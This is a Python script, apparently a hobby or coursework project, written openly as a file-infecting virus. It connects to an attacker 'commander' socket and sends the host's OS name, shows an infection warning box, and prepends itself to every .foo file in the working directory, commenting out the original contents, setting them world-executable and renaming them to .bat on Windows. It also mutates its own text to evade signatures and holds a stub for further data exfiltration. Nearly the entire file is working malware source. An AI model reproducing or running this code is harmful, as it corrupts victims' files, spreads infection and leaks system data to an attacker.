#!/usr/bin/env python3
import socket
import sys
import time
import platform
import ctypes
import subprocess
import glob
import os
import random
import io

# ----------- Variables -----------
host = '127.0.0.1' #Hacker's IP address as a string
port = 9999
target_os = None
infection_message = "You've been infected!!"
target_file_type = ".foo"

# ----------- Functions ----------- 

# -- Infection Message -- 

def post_infection_msg(target_os, infection_msg):
    print(target_os)
    msg_box_title = "WARNING: VIRUS"

    # Spawns a notification box using the default notification GUI functionalities of the OS.
    if target_os == 'Windows':
        ctypes.windll.user32.MessageBoxW(0, infection_msg, msg_box_title, 1)
    else:
        subprocess.run(['notify-send', msg_box_title, infection_msg])

# -- Self Spread Functions --

def is_end(line):
    return True if "# END OF SCRIPT" in line and (len(line.strip()) == len("# END OF SCRIPT")) else False 

def retrieve_code():
    # Open the virus current file, the virus will be extracted from this file. 
    virus_file = open(sys.argv[0], 'r')

    # Read in the virus section using the last line comment as a marker 
    # that the virus has ended.
    virus = []
    for line in virus_file:
        virus.append(line)
        if is_end(line): 
            virus.append("\n")
            break

    virus[0] = "@echo off & python -x \"%~f0\" %* & goto :eof\n" if target_os == "Windows" else "#!/usr/bin/env python3\n"

    return virus

def spread_self(targeted_file_type, virus):

    # Go through files with target file extension.
    for item in glob.glob(str(f"*{targeted_file_type}")):

        # If the OS is windows, file needs to be renamed to batch file
        # so check if batch file with same name already exists.
        new_file_name = item    # Variable only needed for windows instances
        if target_os == "Windows": 
            basename, _ = os.path.splitext(item)
            new_file_name = basename + '.bat'

            if os.path.exists(new_file_name):
                continue

        # Read in the target file
        virus_file = open(item, 'r')
        all_lines = virus_file.readlines()
        virus_file.close()

        # If the virus has infected the current file then move onto the next file.
        if any('data_exfiltration_virus' in line for line in all_lines): 
            continue

        # Allow the current file to execute.
        os.chmod(item, 0o777)
        
        # Open the current target file for writing.
        target_file = open(item, 'w')

        # Prepend the virus into the start of the target file.
        target_file.writelines(virus)

        # Comment out the original file contents and write them back in before closing.
        all_lines = ['#' + line for line in all_lines]
        target_file.writelines(all_lines)
        target_file.close()

        # Reconfigure to a .bat (batch) script
        if target_os == "Windows":
            os.rename(item, new_file_name)
            print(f"Renamed file to {new_file_name}")


# -- Self Mutation Functions -- 
#region

def is_ignore(line):
    return True if "# IGNORE" in line else False

def is_end_ignore(line):
    return True if "# END IGNORE" in line else False

def random_sublist(substitutions):
    num_items = random.randint(1, len(substitutions))
    items = list(substitutions.items())
    return dict(random.sample(items, num_items))

"""
function: mutate_with_substitutions

Replaces elements of the original code with potential substitutions. 


"""
def mutate_with_substitutions(code, substitutions):
    mutated_code = []
    ignore = False
    sub_list = random_sublist(substitutions)

    for line in sub_list:
        print(line)

    for line in code:
        # Skip any sections marked by ignore
        if is_ignore(line) == True or ignore == True:
            ignore = True
            if is_end_ignore(line):
                ignore = False
            mutated_code.append(line)
            continue

        # Mutate line
        for original, substitute in sub_list.items():
            line = line.replace(original, substitute)
        mutated_code.append(line)
    
    return mutated_code

""" 
function: mutate_with_nop

Insert a "no-operation" equivalent statement in code. This is done using 
commands such as pass or unnecessary variable assignments. 
"""
#TODO: If working implement ways to prepend lines too.
#TODO: If prepend and append are working, integrate number number generator to prepend
# and append random amounts of lines.
def mutate_with_nop(code):
    mutated_lines = []
    found_end = False

    for line in code:
        mutated_lines.append(line)
        
        if is_end(line): break 

        if line.strip() == "pass":          # Randomly insert a "NOP"
            if random.random() < 0.05: continue
        elif random.random() < 0.05:        # If a "NOP" already exists at the line, randomly remove it.
            mutated_lines.append("pass\n")

    return mutated_lines

"""
function: swap_code

Swaps code according to the substitutions, this means that operators and variables can be
swapped. 

This simulates register swapping in assembly for python by swapping around the names
of variables. 
"""
#TODO: Change the substitutions to reflect the actual variables in the virus.
def swap_code(code):
    # IGNORE
    substitutions = {
        "# END OF SCRIPT": "# END OF CODE",
        "virus": "evil_stuff",
        "pass": "#pass"
    }
    # END IGNORE

    return mutate_with_substitutions(code, substitutions)

#endregion

# -- Data Exfiltration --
#region

"""
function: send_data

A wrapper for socket.send() which encodes automatically in utf-8.
"""
def send_data(s, data):
    s.send(f"{data}".encode('utf-8'))

#endregion

# ----------- Main Operations ----------- 

# (1) Retrieve host OS information.
target_os = platform.system()

# (2) Establish connection with commander.
s = socket.socket()
s.connect((host, port))

send_data(s, f"Target OS: '{str(target_os)}'")

# (3) Send infection message.
post_infection_msg(target_os, infection_message)


# (4) Data Exfiltration


# 4.1 For now exfiltrate the type of OS that the host is, the pwd, 
#      and the list of files in the current directory.


# (5) Self Mutations
virus = retrieve_code()
# virus = mutate_with_nop(virus)
virus = swap_code(virus)

# exec_code = compile(''.join(virus), '<string>', 'exec')
# print(f"  Co_code (bytecode): {exec_code.co_code}")


# (6) Perform Self Spread
spread_self(target_file_type, ''.join(virus))
sys.exit(1)

# END OF SCRIPT